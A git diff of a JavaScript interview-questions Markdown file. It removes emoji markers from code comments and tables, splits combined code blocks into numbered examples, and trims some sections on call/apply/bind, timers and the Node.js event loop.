@@ -4125,61 +4125,6 @@ console.log(fun2.length); // 2
     <b><a href="#table-of-contents">↥ back to top</a></b>
 </div>
 
-## Q. What is the difference between Call, Apply and Bind?
-
-**1. Call:** invokes the function and allows you to pass in arguments one by one.
-
-**Example:**
-
-```js
-const person = { name: "Sahima Mutti" };
-
-function say(greeting) {
-  return `${greeting}, ${this.name}`;
-}
-
-// call — invokes immediately, args passed individually
-say.call(person, "Hi");    // Hi Sahima Mutti 
-```
-
-**2. Apply:** invokes the function and allows you to pass in arguments as an array.
-
-**Example:**
-
-```js
-const person = { name: "Sahima Mutti" };
-
-function say(greeting) {
-  return `${greeting}, ${this.name}`;
-}
-
-// apply — invokes immediately, args passed as array
-say.apply(person, ["Hi"]);    // Hi Sahima Mutti 
-```
-
-**3. Bind:** returns a new function, allowing you to pass in a this array and any number of arguments.
-
-**Example:**
-
-```js
-const person = { name: "Sahima Mutti"};
-
-function say(greeting) {
-  return `${greeting}, ${this.name}`;
-}
-
-// bind — returns a NEW function, does not invoke immediately
-const sayPerson = say.bind(person, "Hello");
-
-sayPerson();    // Hi Sahima Mutti 
-```
-
-**&#9885; [Try this example on CodeSandbox](https://codesandbox.io/s/js-call-apply-bind-xwenyv?file=/src/index.js)**
-
-<div align="right">
-    <b><a href="#table-of-contents">↥ back to top</a></b>
-</div>
-
 ## Q. What is bind method in javascript?
 
 The `bind()` method creates a new function, when invoked, has the `this` sets to a provided value. The `bind()` method allows an object to borrow a method from another object without making a copy of that method. This is known as function **borrowing** in JavaScript.
@@ -5283,9 +5228,9 @@ function demonstrateScope() {
     const immutable  = 'const'; // same block scope as let
   }
 
-  console.log(funcScoped);   // 'var'    ✅
-  // console.log(blockScoped); // ReferenceError ❌
-  // console.log(immutable);   // ReferenceError ❌
+  console.log(funcScoped);   // 'var'    
+  // console.log(blockScoped); // ReferenceError 
+  // console.log(immutable);   // ReferenceError 
 }
 
 // Classic var-in-loop bug
@@ -5314,10 +5259,10 @@ In ES6, **let** bindings are not subject to "variable hoisting", which means tha
 Referencing the variable in the block before the initialization results in a `ReferenceError` (contrary to a variable declared with var, which will just have the **undefined** value). The variable is in a "temporal dead zone" from the start of the block until the initialization is processed.
 
 ```js
-console.log(x); // ✅ undefined  — var is hoisted and initialised to undefined
+console.log(x); //  undefined  — var is hoisted and initialised to undefined
 var x = 5;
 
-console.log(y); // ❌ ReferenceError: Cannot access 'y' before initialization
+console.log(y); //  ReferenceError: Cannot access 'y' before initialization
 let y = 10;
 
 // TDZ also applies inside blocks
@@ -5432,7 +5377,7 @@ Common patterns that cause leaks:
 3. **Detached DOM nodes** — a closure holds a reference to a DOM node that has been removed from the document.
 
 ```js
-// ❌ Leak: interval callback closes over largeData forever
+//  Leak: interval callback closes over largeData forever
 function startPolling() {
   const largeData = new Array(100_000).fill('payload');
 
@@ -5443,7 +5388,7 @@ function startPolling() {
   // Missing: return id so the caller can clearInterval(id)
 }
 
-// ✅ Fix: return cleanup, or null out the reference
+//  Fix: return cleanup, or null out the reference
 function startPollingFixed() {
   const largeData = new Array(100_000).fill('payload');
 
@@ -5538,7 +5483,7 @@ V8 optimises this through:
 **Example:**
 
 ```js
-// ❌ Unnecessarily deep scope chain — engine must walk up 3 levels on each access
+//  Unnecessarily deep scope chain — engine must walk up 3 levels on each access
 function level1() {
   const config = loadHeavyConfig(); // heap-allocated context (closed over)
 
@@ -5551,7 +5496,7 @@ function level1() {
   return level2;
 }
 
-// ✅ Flatten: extract only needed value to the immediate scope
+//  Flatten: extract only needed value to the immediate scope
 function level1Optimised() {
   const { timeout } = loadHeavyConfig(); // only close over what is needed
 
@@ -5593,24 +5538,24 @@ const timer = {
   label: 'Countdown',
   seconds: 3,
 
-  // ❌ Regular function: `this` is determined by caller (lost in setTimeout callback)
+  //  Regular function: `this` is determined by caller (lost in setTimeout callback)
   startBroken() {
     setTimeout(function () {
       console.log(this.label); // undefined — `this` is global/undefined (strict mode)
     }, 1000);
   },
 
-  // ✅ Arrow function: `this` inherited lexically from startFixed\'s scope
+  //  Arrow function: `this` inherited lexically from startFixed\'s scope
   startFixed() {
     setTimeout(() => {
-      console.log(this.label); // 'Countdown' ✅
+      console.log(this.label); // 'Countdown' 
     }, 1000);
   },
 
-  // ✅ Explicit bind alternative
+  //  Explicit bind alternative
   startWithBind() {
     setTimeout(function () {
-      console.log(this.label); // 'Countdown' ✅
+      console.log(this.label); // 'Countdown' 
     }.bind(this), 1000);
   },
 };
@@ -5684,13 +5629,13 @@ What gets hoisted and how:
 
 | Declaration | Hoisted? | Initialised to |
 |---|---|---|
-| `var` | ✅ Yes | `undefined` |
-| `let` | ✅ Yes (TDZ) | uninitialised — `ReferenceError` if accessed before declaration |
-| `const` | ✅ Yes (TDZ) | uninitialised — `ReferenceError` if accessed before declaration |
-| `function` declaration | ✅ Yes | Full function body |
+| `var` |  Yes | `undefined` |
+| `let` |  Yes (TDZ) | uninitialised — `ReferenceError` if accessed before declaration |
+| `const` |  Yes (TDZ) | uninitialised — `ReferenceError` if accessed before declaration |
+| `function` declaration |  Yes | Full function body |
 | `function` expression (`var f = function(){}`) | Partially | `var f` hoisted as `undefined`; body is **not** hoisted |
-| `class` declaration | ✅ Yes (TDZ) | uninitialised — `ReferenceError` if accessed before declaration |
-| `import` | ✅ Yes | Fully evaluated before module body runs |
+| `class` declaration |  Yes (TDZ) | uninitialised — `ReferenceError` if accessed before declaration |
+| `import` |  Yes | Fully evaluated before module body runs |
 
 **Real-World Use Case:**
 
@@ -5750,14 +5695,14 @@ foo(); // Now foo is defined here
 **Example:**
 
 ```js
-// 1. Function Declaration — fully hoisted ✅
+// 1. Function Declaration — fully hoisted 
 console.log(add(2, 3)); // 5
 
 function add(a, b) {
   return a + b;
 }
 
-// 2. Function Expression with var — var hoisted as undefined ❌
+// 2. Function Expression with var — var hoisted as undefined 
 console.log(multiply); // undefined
 // console.log(multiply(2, 3)); // TypeError: multiply is not a function
 
@@ -5765,7 +5710,7 @@ var multiply = function (a, b) {
   return a * b;
 };
 
-// 3. Function Expression with let — TDZ ❌
+// 3. Function Expression with let — TDZ 
 // console.log(divide(10, 2)); // ReferenceError
 const divide = (a, b) => a / b;
 
@@ -5792,7 +5737,7 @@ Class declarations are hoisted to the top of their block scope — like `let` an
 **Example:**
 
 ```js
-// ❌ Class in TDZ — accessing before declaration throws ReferenceError
+//  Class in TDZ — accessing before declaration throws ReferenceError
 // const p = new Person('Alice'); // ReferenceError: Cannot access 'Person' before initialization
 
 class Person {
@@ -5804,7 +5749,7 @@ class Person {
   }
 }
 
-const p = new Person('Alice'); // ✅
+const p = new Person('Alice'); // 
 console.log(p.greet());        // 'Hi, I am Alice'
 
 // Class expression — same as function expression: name is in TDZ if const/let
@@ -5814,18 +5759,18 @@ const Animal = class {
   }
 };
 
-const dog = new Animal('Canis lupus'); // ✅
+const dog = new Animal('Canis lupus'); // 
 ```
 
 **Practical implication — class vs. function constructor:**
 
 ```js
 // Function constructor: hoisted entirely — can be used before declaration
-const f = new Foo(); // ✅
+const f = new Foo(); // 
 function Foo() { this.x = 1; }
 
 // Class: TDZ — cannot be used before declaration
-// const b = new Bar(); // ❌ ReferenceError
+// const b = new Bar(); //  ReferenceError
 class Bar { constructor() { this.x = 1; } }
 ```
 
@@ -5844,7 +5789,7 @@ When splitting large Node.js services into files with circular `require()` refer
 **Example:**
 
 ```js
-// ❌ SyntaxError: Identifier 'result' has already been declared
+//  SyntaxError: Identifier 'result' has already been declared
 function getLabel(status) {
   switch (status) {
     case 'active':
@@ -5856,7 +5801,7 @@ function getLabel(status) {
   }
 }
 
-// ✅ Fix 1: wrap each case in its own block
+//  Fix 1: wrap each case in its own block
 function getLabelFixed(status) {
   switch (status) {
     case 'active': {
@@ -5872,7 +5817,7 @@ function getLabelFixed(status) {
   }
 }
 
-// ✅ Fix 2: prefer object lookup over switch for simple mappings
+//  Fix 2: prefer object lookup over switch for simple mappings
 const STATUS_LABELS = {
   active:   'User is active',
   inactive: 'User is inactive',
@@ -5946,10 +5891,10 @@ Arrow functions (`=>`) introduced in ES2015 are a concise syntax for writing fun
 | Feature | Regular Function | Arrow Function |
 |---|---|---|
 | `this` binding | Dynamic — determined by call site | Lexical — inherits from enclosing scope |
-| `arguments` object | ✅ Available | ❌ Not available (use rest params) |
-| `new` (constructor) | ✅ Can be used | ❌ Throws `TypeError` |
-| `prototype` property | ✅ Has one | ❌ `undefined` |
-| `super` / `new.target` | ✅ Own binding | ❌ Inherited from enclosing scope |
+| `arguments` object |  Available |  Not available (use rest params) |
+| `new` (constructor) |  Can be used |  Throws `TypeError` |
+| `prototype` property |  Has one |  `undefined` |
+| `super` / `new.target` |  Own binding |  Inherited from enclosing scope |
 | Method shorthand | Usable (with caution) | Avoid for object methods needing `this` |
 
 **When NOT to use arrow functions:**
@@ -5987,20 +5932,20 @@ class Timer {
 // --- When NOT to use arrow ---
 const counter = {
   count: 0,
-  // ❌ Arrow: `this` is the module/global scope, not counter
+  //  Arrow: `this` is the module/global scope, not counter
   incrementBad: () => { counter.count++; },
-  // ✅ Method shorthand: `this` is counter
+  //  Method shorthand: `this` is counter
   incrementGood() { this.count++; },
 };
 
-// ❌ Arrow as constructor
+//  Arrow as constructor
 // const p = new (() => {}); // TypeError: (intermediate value) is not a constructor
 
-// ❌ No own `arguments`
+//  No own `arguments`
 const fn = () => {
   // console.log(arguments); // ReferenceError in strict mode / module scope
 };
-const fn2 = (...args) => args; // ✅ Use rest params instead
+const fn2 = (...args) => args; //  Use rest params instead
 ```
 
 **Real-World Use Case:**
@@ -6124,7 +6069,7 @@ function renderCard({ title, subtitle = 'No subtitle', tags = [] } = {}) {
 }
 
 renderCard({ title: 'Hello', tags: ['js', 'es6'] });
-renderCard(); // ✅ uses defaults — the `= {}` prevents TypeError when called with no args
+renderCard(); //  uses defaults — the `= {}` prevents TypeError when called with no args
 
 // ── Mixed / deeply nested ─────────────────────────────────────────────────────
 
@@ -6216,7 +6161,7 @@ Redux reducers use object spread to produce new state immutably without mutating
 | Size | `Object.keys(obj).length` — O(n) | `map.size` — O(1) |
 | Iteration | `for...in` (includes prototype) / `Object.entries()` | `for...of`, `forEach`, direct iterators |
 | Prototype pollution | Possible (e.g., `__proto__`) | Not possible |
-| JSON serialisable | ✅ | ❌ (needs custom serialiser) |
+| JSON serialisable | Yes |  (needs custom serialiser) |
 
 | Feature | `Array` | `Set` |
 |---|---|---|
@@ -6286,7 +6231,7 @@ function createUser(name, role = 'viewer', createdAt = new Date()) {
 createUser('Alice');                     // role: 'viewer', createdAt: <now>
 createUser('Bob', 'admin');             // role: 'admin'
 createUser('Carol', undefined, new Date('2024-01-01')); // role: 'viewer' (undefined triggers default)
-createUser('Dave', null);              // role: null — null does NOT trigger default ⚠️
+createUser('Dave', null);              // role: null — null does NOT trigger default 
 
 // Default referencing earlier parameter
 function range(start, end = start + 10) {
@@ -6370,7 +6315,7 @@ const evens = new Range(2, 10, 2);
 
 for (const n of evens)     console.log(n);    // 2 4 6 8 10
 console.log([...evens]);                       // [2, 4, 6, 8, 10]
-const [first, second] = evens;                 // destructuring ✅
+const [first, second] = evens;                 // destructuring 
 console.log(first, second);                    // 2, 4
 
 // ── Symbol.toPrimitive — custom type coercion ────────────────────────────────
@@ -6916,9 +6861,9 @@ requestAnimationFrame(animate);
 
 | | `requestAnimationFrame` | `setTimeout` |
 |--|------------------------|-------------|
-| Tied to display refresh rate | ✅ Yes (usually 60 fps) | ❌ No |
-| Paused in background tabs | ✅ Yes (saves battery) | ❌ No |
-| Ideal for animations | ✅ | ⚠️ Can cause jank |
+| Tied to display refresh rate |  Yes (usually 60 fps) |  No |
+| Paused in background tabs |  Yes (saves battery) |  No |
+| Ideal for animations |  |  Can cause jank |
 | Precision | High | Lower (can drift) |
 
 **Use cases:**
@@ -7524,10 +7469,10 @@ The **Web Storage API** provides two browser-side key-value stores that let web 
 | Scope | Shared across all tabs/windows with the same origin | Isolated to the **specific tab** that created it — not shared with other tabs, even at the same origin |
 | Capacity | ~5–10 MB per origin (browser-dependent) | ~5 MB per origin per tab |
 | Accessible from | All tabs / workers at same origin | Only the originating tab |
-| Survives refresh | ✅ | ✅ |
-| Survives tab close | ✅ | ❌ |
-| Server access | ❌ (never sent in HTTP requests) | ❌ |
-| Available in workers | ❌ (not in Service/Web Workers) | ❌ |
+| Survives refresh | Yes | Yes |
+| Survives tab close | Yes | No |
+| Server access | No (never sent in HTTP requests) | No |
+| Available in workers | No (not in Service/Web Workers) | No |
 
 Both storages are **origin-scoped** (`protocol + hostname + port`) — a page on `https://app.example.com` cannot access storage set by `https://api.example.com`.
 
@@ -7570,16 +7515,16 @@ The Web Storage API stores all values as **plain strings**. Passing a non-string
 **Example:**
 
 ```js
-// ❌ Data corruption — objects are coerced to strings
+//  Data corruption — objects are coerced to strings
 localStorage.setItem('user', { name: 'Alice' });
 localStorage.getItem('user'); // '[object Object]'
 
-// ✅ Use JSON.stringify / JSON.parse
+//  Use JSON.stringify / JSON.parse
 localStorage.setItem('user', JSON.stringify({ name: 'Alice', age: 30 }));
 const user = JSON.parse(localStorage.getItem('user'));
 console.log(user.name); // 'Alice'
 
-// ✅ Safe helper with fallback
+//  Safe helper with fallback
 function storageGet(key, fallback = null) {
   try {
     const raw = localStorage.getItem(key);
@@ -7673,13 +7618,13 @@ Web Storage\'s biggest security limitation is that it is **fully accessible to a
 **Mitigations:**
 
 ```js
-// ❌ NEVER store sensitive auth tokens in localStorage
+//  NEVER store sensitive auth tokens in localStorage
 localStorage.setItem('authToken', jwtToken); // compromised by any XSS
 
-// ✅ Prefer HttpOnly cookies for auth tokens (set by server, never readable by JS)
+//  Prefer HttpOnly cookies for auth tokens (set by server, never readable by JS)
 // Set-Cookie: token=<jwt>; HttpOnly; Secure; SameSite=Strict
 
-// ✅ If you MUST use storage (e.g., SPAs without cookie-based auth):
+//  If you MUST use storage (e.g., SPAs without cookie-based auth):
 // 1. Store only short-lived access tokens (refresh via HttpOnly cookie)
 // 2. Implement strict Content Security Policy to minimise XSS surface
 // 3. Validate and sanitise ALL values read from storage before use
@@ -7705,7 +7650,7 @@ function safeReadConfig(key) {
   return parsed;
 }
 
-// ✅ Content Security Policy header (set server-side, limits XSS attack surface)
+//  Content Security Policy header (set server-side, limits XSS attack surface)
 // Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
 ```
 
@@ -7741,16 +7686,16 @@ The OWASP Web Security Testing Guide explicitly recommends against storing JWTs 
 
 | Storage | Async? | Capacity | Queryable? | Worker Access | Best For |
 |---|---|---|---|---|---|
-| `localStorage` | ❌ Sync | ~5–10 MB | ❌ | ❌ | Small preferences, flags |
-| `sessionStorage` | ❌ Sync | ~5 MB | ❌ | ❌ | Tab-scoped transient state |
-| **IndexedDB** | ✅ Async | 50%+ of disk | ✅ (indexed) | ✅ Service Workers | Large structured data, offline apps |
-| **Cache API** | ✅ Async | Large | ❌ (by URL) | ✅ Service Workers | Network response caching (PWAs) |
-| **Cookies** | ❌ Sync | ~4 KB | ❌ | ❌ | Auth (HttpOnly), server-shared state |
+| `localStorage` | No Sync | ~5–10 MB | No | No | Small preferences, flags |
+| `sessionStorage` | No Sync | ~5 MB | No | No | Tab-scoped transient state |
+| **IndexedDB** |  Async | 50%+ of disk |  (indexed) |  Service Workers | Large structured data, offline apps |
+| **Cache API** |  Async | Large | No (by URL) |  Service Workers | Network response caching (PWAs) |
+| **Cookies** | No Sync | ~4 KB | No | No | Auth (HttpOnly), server-shared state |
 | Memory (variable) | N/A | RAM limit | N/A | Per-context | Ephemeral in-session state |
 
 ```js
 // ── localStorage: fine for small data ────────────────────────────────────────
-localStorage.setItem('lang', 'en'); // ✅ sub-millisecond, tiny payload
+localStorage.setItem('lang', 'en'); //  sub-millisecond, tiny payload
 
 // ── IndexedDB via idb library (async, large data) ─────────────────────────────
 import { openDB } from 'idb'; // lightweight IDB wrapper
@@ -7770,12 +7715,12 @@ const byAuthor = await db.getAllFromIndex('articles', 'by-author', 42);
 console.log(byAuthor); // all articles by author 42
 
 // ── Avoid localStorage in hot paths ───────────────────────────────────────────
-// ❌ Do not call localStorage inside a resize/scroll handler
+//  Do not call localStorage inside a resize/scroll handler
 window.addEventListener('scroll', () => {
   localStorage.setItem('scrollPos', window.scrollY); // blocks main thread every scroll event
 });
 
-// ✅ Debounce or use in-memory state + persist on pause
+//  Debounce or use in-memory state + persist on pause
 let scrollPos = 0;
 const saveScroll = debounce(() => localStorage.setItem('scrollPos', scrollPos), 300);
 window.addEventListener('scroll', () => { scrollPos = window.scrollY; saveScroll(); });
@@ -8628,7 +8573,7 @@ async function loadProfile(userId) {
 
 async function badExample() {
   try {
-    fetch('/api/broken'); // ❌ not awaited — rejection escapes try/catch
+    fetch('/api/broken'); //  not awaited — rejection escapes try/catch
   } catch (err) {
     console.error('This never runs');
   }
@@ -8640,7 +8585,7 @@ async function badExample() {
  */
 
 async function riskyParallel() {
-  const p1 = fetch('/api/a'); // ❌ rejection unhandled if not awaited
+  const p1 = fetch('/api/a'); //  rejection unhandled if not awaited
   const p2 = fetch('/api/b');
   // ... other work
   return [await p1, await p2]; // only caught here, but p1 rejection may fire earlier
@@ -8661,7 +8606,7 @@ Express.js does not natively catch errors thrown from `async` route handlers —
 
 The correct approach for independent async operations is to **start all Promises simultaneously** and `await` their collective resolution with `Promise.all` (fail-fast) or `Promise.allSettled` (wait for all, regardless of failures).
 
-**Example:**
+**Example 01:**
 
 ```js
 /**
@@ -8671,23 +8616,29 @@ The correct approach for independent async operations is to **start all Promises
 async function loadSequential(userIds) {
   const users = [];
   for (const id of userIds) {
-    const user = await fetchUser(id); // each waits for the previous ❌
+    const user = await fetchUser(id); // each waits for the previous 
     users.push(user);
   }
   return users;
   // 3 users × 200ms each = ~600ms total
 }
 ```
+
+**Example 02:**
+
 ```js
 /**
  * Parallel with Promise.all — fast (max of durations) 
  */
 
 async function loadParallel(userIds) {
-  return Promise.all(userIds.map(id => fetchUser(id))); // all start immediately ✅
+  return Promise.all(userIds.map(id => fetchUser(id))); // all start immediately 
   // 3 users × 200ms each = ~200ms total (limited by slowest)
 }
 ```
+
+**Example 03:**
+
 ```js
 /**
  * Promise.allSettled — parallel, no fail-fast
@@ -8702,6 +8653,9 @@ async function loadWithPartialFailure(userIds) {
   }));
 }
 ```
+
+**Example 04:**
+
 ```js
 /**
  * Controlled concurrency — avoid hammering APIs 
@@ -8717,6 +8671,9 @@ async function loadWithConcurrencyLimit(userIds, concurrency = 3) {
   return results;
 }
 ```
+
+**Example 05:**
+
 ```js
 /**
  * Promise.race — first to settle wins (useful for timeouts) 
@@ -8731,6 +8688,9 @@ function withTimeout(promise, ms) {
 
 const user = await withTimeout(fetchUser(1), 3000); // throws if fetch takes > 3s
 ```
+
+**Example 06:**
+
 ```js
 /**
  * Promise.any — first to fulfil (ignore rejections) 
@@ -8816,11 +8776,14 @@ JavaScript is **single-threaded** — it has one call stack and executes one pie
 | **Event Loop** | Continuously checks: if stack is empty, drain the entire microtask queue, then take ONE macrotask |
 
 **Execution order per loop iteration (tick):**
+
 1. Execute the current synchronous code (call stack).
 2. Drain the **entire microtask queue** (all microtasks, including any queued by microtasks).
 3. Render/paint updates (browser only, between tasks).
 4. Execute **one** macrotask from the macrotask queue.
 5. Go to step 2.
+
+**Example:**
 
 ```js
 console.log('1 — sync');
@@ -8874,20 +8837,32 @@ The distinction between microtasks and macrotasks determines **when** callbacks 
 
 **Critical difference:** After each macrotask, the **entire** microtask queue is drained before the next macrotask or render. A microtask that enqueues another microtask keeps the loop in the microtask phase — this can **starve** macrotasks (including UI rendering) indefinitely.
 
+**Example 01:**
+
 ```js
-// ── Microtask starvation — infinite microtask loop starves the render ─────────
+/**
+ * Microtask starvation — infinite microtask loop starves the render 
+ */
+
 function recursiveMicrotask() {
-  Promise.resolve().then(recursiveMicrotask); // ❌ infinite microtask chain
+  Promise.resolve().then(recursiveMicrotask); //  infinite microtask chain
   // The browser can never paint — UI freezes
 }
 // recursiveMicrotask(); // DO NOT RUN — for illustration only
 
 // ── Correct: use macrotask (setTimeout/rAF) for deferred work ────────────────
 function deferredWork() {
-  setTimeout(deferredWork, 0); // ✅ yields to the event loop between iterations
+  setTimeout(deferredWork, 0); //  yields to the event loop between iterations
 }
+```
 
-// ── Ordering example: Promise vs setTimeout ───────────────────────────────────
+**Example 02:**
+
+```js
+/**
+ * Ordering example: Promise vs setTimeout 
+ */
+
 async function demo() {
   console.log('A');
 
@@ -8907,8 +8882,15 @@ console.log('F — sync, after demo() call');
 
 // Output: A → F → C → E → B → D
 // A (sync inside demo), F (sync after demo() returns), C & E (microtasks), B & D (macrotasks)
+```
 
-// ── Node.js specific: process.nextTick runs BEFORE Promise microtasks ─────────
+**Example 03:**
+
+```js
+/**
+ * Node.js specific: process.nextTick runs BEFORE Promise microtasks 
+ */
+
 process.nextTick(() => console.log('nextTick — before Promises'));
 Promise.resolve().then(() => console.log('Promise.then'));
 // nextTick → Promise.then
@@ -8925,31 +8907,20 @@ Vue.js\'s `nextTick()` API was historically implemented as a microtask (using `P
 ## Q. How does `setTimeout(fn, 0)` actually behave, and what are its timer accuracy limitations?
 
 `setTimeout(fn, 0)` does **not** execute `fn` immediately or even after exactly 0 milliseconds. It schedules `fn` as a **macrotask** — it will not run until:
+
 1. The current call stack is empty.
 2. The entire microtask queue is drained.
 3. The event loop picks the next macrotask.
 
 Additionally, browsers enforce a **minimum timer delay** of **4ms** after 5 nested `setTimeout` calls (the "clamping" rule, per the HTML spec). In background tabs, browsers further throttle timers to 1000ms (1 second) to save CPU. Node.js has a minimum delay of 1ms but also subject to the event loop\'s libuv timer phase overhead.
 
+**Example:**
+
 ```js
-// ── Minimum delay clamping after 5 nesting levels ─────────────────────────────
-let depth = 0;
-let last  = Date.now();
+/**
+ * Use case: yielding to the event loop to prevent blocking 
+ */
 
-function nestTimer() {
-  const now   = Date.now();
-  const delta = now - last;
-  last = now;
-  console.log(`Depth ${depth}: ${delta}ms elapsed`);
-
-  if (++depth < 10) setTimeout(nestTimer, 0);
-}
-
-setTimeout(nestTimer, 0);
-// Depth 0–4: ~0–1ms (libuv / browser overhead)
-// Depth 5+:  ~4ms   (browser clamps to 4ms minimum)
-
-// ── Use case: yielding to the event loop to prevent blocking ──────────────────
 async function processLargeArray(items) {
   const CHUNK = 500;
   for (let i = 0; i < items.length; i += CHUNK) {
@@ -8960,43 +8931,11 @@ async function processLargeArray(items) {
     await new Promise(resolve => setTimeout(resolve, 0));
   }
 }
-
-// ── requestAnimationFrame — better than setTimeout for visual work ────────────
-function animateProgress(target) {
-  let current = 0;
-
-  function step() {
-    current = Math.min(current + 1, target);
-    updateProgressBar(current);
-
-    if (current < target) {
-      requestAnimationFrame(step); // synced to display refresh (~16.7ms at 60fps)
-    }
-  }
-
-  requestAnimationFrame(step);
-}
-
-// ── setInterval drift — why intervals are unreliable for precise timing ────────
-// setInterval accumulates drift because it measures from when the callback
-// was SCHEDULED, not when it COMPLETED. Use recursive setTimeout instead:
-function preciseInterval(fn, ms) {
-  let expected = Date.now() + ms;
-
-  function step() {
-    const drift = Date.now() - expected;
-    fn();
-    expected += ms;
-    setTimeout(step, Math.max(0, ms - drift)); // compensate for drift
-  }
-
-  setTimeout(step, ms);
-}
 ```
 
 **Real-World Use Case:**
 
-Data-grid libraries like AG Grid use `setTimeout(fn, 0)` to **chunk large render operations** — rendering 100 rows at a time and yielding between chunks — preventing the browser from becoming unresponsive while loading thousands of rows. `requestAnimationFrame` is used for smooth column resize animations. Understanding timer clamping explains why some polling-based libraries (e.g., older versions of Socket.IO\'s long-polling transport) had unexpected 4ms minimum latency on nested timer re-schedules.
+Data-grid libraries like AG Grid use `setTimeout(fn, 0)` to **chunk large render operations** — rendering 100 rows at a time and yielding between chunks — preventing the browser from becoming unresponsive while loading thousands of rows. 
 
 <div align="right">
     <b><a href="#table-of-contents">↥ back to top</a></b>
@@ -9038,8 +8977,13 @@ Node.js uses **libuv** for its event loop, which has a more complex, **multi-pha
 1. `process.nextTick` queue — **before** Promise microtasks
 2. Promise microtask queue — `Promise.then` / `async` continuations
 
+**Example:**
+
 ```js
-// ── Execution order in Node.js ────────────────────────────────────────────────
+/**
+ * Execution order in Node.js 
+ */
+
 setImmediate(() => console.log('A — setImmediate (check phase)'));
 setTimeout(() => console.log('B — setTimeout (timers phase)'), 0);
 
@@ -9050,38 +8994,11 @@ console.log('E — sync');
 
 // Output: E → D → C → B or A (timer vs check order is non-deterministic
 //          when both are 0ms, depends on event loop entry time) → the other of B/A
-
-// ── nextTick starvation risk ──────────────────────────────────────────────────
-// process.nextTick runs before EVERY phase transition — abuse starves I/O
-function recursiveNextTick() {
-  process.nextTick(recursiveNextTick); // ❌ starves ALL I/O and timers
-}
-
-// ── setImmediate vs setTimeout(fn, 0) in I/O callbacks ───────────────────────
-const fs = require('fs');
-
-fs.readFile(__filename, () => {
-  // Inside an I/O callback — we are in the poll phase
-  setTimeout(  () => console.log('setTimeout'),   0); // timers phase — NEXT iteration
-  setImmediate(() => console.log('setImmediate'));     // check phase — SAME iteration
-  // setImmediate ALWAYS fires before setTimeout inside an I/O callback ✅
-});
-
-// ── Practical: use nextTick to ensure callback fires after current stack ───────
-class EventEmitter {
-  constructor() { this._listeners = []; }
-
-  on(fn)   { this._listeners.push(fn); return this; }
-  emit(data) {
-    // Defer emission so listeners registered synchronously after on() still fire
-    process.nextTick(() => this._listeners.forEach(fn => fn(data)));
-  }
-}
 ```
 
 **Real-World Use Case:**
 
-Node.js HTTP server frameworks like Fastify and Express use `process.nextTick` internally to defer error propagation and middleware continuations to the next microtask checkpoint — ensuring that all synchronous setup code in a route handler completes before the framework processes the response. Misconfiguring this (e.g., using `setImmediate` instead of `nextTick` for error forwarding) causes subtle ordering bugs where response headers are sent before error middleware has had a chance to modify them — a class of bugs found in early Koa.js releases.
+Node.js HTTP server frameworks like Fastify and Express use `process.nextTick` internally to defer error propagation and middleware continuations to the next microtask checkpoint — ensuring that all synchronous setup code in a route handler completes before the framework processes the response. 
 
 <div align="right">
     <b><a href="#table-of-contents">↥ back to top</a></b>
@@ -9104,25 +9021,51 @@ Node.js HTTP server frameworks like Fastify and Express use `process.nextTick` i
 
 Arrow functions are the exception: they have **no own `this`** — they capture `this` lexically from their enclosing scope at definition time and no binding rule can change it.
 
+**Example 01:**
+
 ```js
-// ── Default binding ───────────────────────────────────────────────────────────
+/**
+ * Default binding
+ */
+
 function whoAmI() {
   console.log(this); // globalThis in sloppy mode, undefined in strict mode
 }
 whoAmI();
+```
 
-// ── Implicit binding ──────────────────────────────────────────────────────────
+**Example 02:**
+
+```js
+/**
+ * Implicit binding
+ */
+
 const obj = {
   name: 'Alice',
   greet() { console.log(`Hi from ${this.name}`); },
 };
 obj.greet(); // 'Hi from Alice' — this = obj
+```
 
-// ── Implicit binding LOST when method is extracted ────────────────────────────
+**Example 03:**
+
+```js
+/**
+ * Implicit binding LOST when method is extracted
+ */
+
 const greet = obj.greet;
-greet(); // 'Hi from undefined' — this = globalThis/undefined ⚠️
+greet(); // 'Hi from undefined' — this = globalThis/undefined 
+```
 
-// ── Explicit binding ──────────────────────────────────────────────────────────
+**Example 04:**
+
+```js
+/**
+ * Explicit binding 
+ */
+
 function introduce(role) {
   console.log(`${this.name} is a ${role}`);
 }
@@ -9130,15 +9073,29 @@ introduce.call(  { name: 'Bob' },  'developer'); // Bob is a developer
 introduce.apply( { name: 'Carol' }, ['designer']); // Carol is a designer
 const boundFn = introduce.bind({ name: 'Dave' });
 boundFn('manager'); // Dave is a manager
+```
 
-// ── new binding ───────────────────────────────────────────────────────────────
+**Example 05:**
+
+```js
+/**
+ * new binding 
+ */
+
 function Person(name) {
   this.name = name; // this = newly created object
 }
 const alice = new Person('Alice');
 console.log(alice.name); // 'Alice'
+```
 
-// ── Arrow functions — lexical this ───────────────────────────────────────────
+**Example 06:**
+
+```js
+/**
+ * Arrow functions — lexical this 
+ */
+
 const timer = {
   count: 0,
   start() {
@@ -9149,8 +9106,15 @@ const timer = {
   },
 };
 timer.start();
+```
 
-// ── Class methods ─────────────────────────────────────────────────────────────
+**Example 07:**
+
+```js
+/**
+ * Class methods
+ */
+
 class Counter {
   #count = 0;
 
@@ -9165,74 +9129,64 @@ class Counter {
 
 const c = new Counter();
 const { decrement } = c;   // extracted
-decrement();               // ✅ still works — arrow field preserves this
+decrement();               //  still works — arrow field preserves this
 // c.increment extracted would break — regular method loses this
 ```
-
-**Real-World Use Case:**
-
-React\'s move from class components to functional components was partly motivated by the `this` confusion. In class components, event handlers required `.bind(this)` in the constructor or arrow class fields because a method passed to `onClick` loses its implicit binding — `this` becomes `undefined` in strict mode. Functional components eliminate `this` entirely; hooks close over state values lexically, removing an entire category of binding bugs from large React codebases.
 
 <div align="right">
     <b><a href="#table-of-contents">↥ back to top</a></b>
 </div>
 
-## Q. What is the difference between `.call()`, `.apply()`, and `.bind()`, and when do you use each?
+## Q. What is the difference between Call, Apply and Bind?
 
-All three are `Function.prototype` methods that **explicitly set `this`** for a function invocation. The difference is in how they invoke the function and pass arguments:
+**1. Call:** invokes the function and allows you to pass in arguments one by one.
 
-| Method | Invokes immediately? | Arguments | Returns |
-|---|---|---|---|
-| `.call(ctx, arg1, arg2, ...)` | ✅ Yes | Spread as individual args | Function\'s return value |
-| `.apply(ctx, [arg1, arg2])` | ✅ Yes | Single array of args | Function\'s return value |
-| `.bind(ctx, arg1, ...)` | ❌ No | Pre-bound (partial application) | New bound function |
-
-`.bind()` also creates a **permanent** binding — calling `.call()` or `.apply()` on a bound function cannot override the bound `this`.
+**Example:**
 
 ```js
-function formatCurrency(amount, symbol = '$', decimals = 2) {
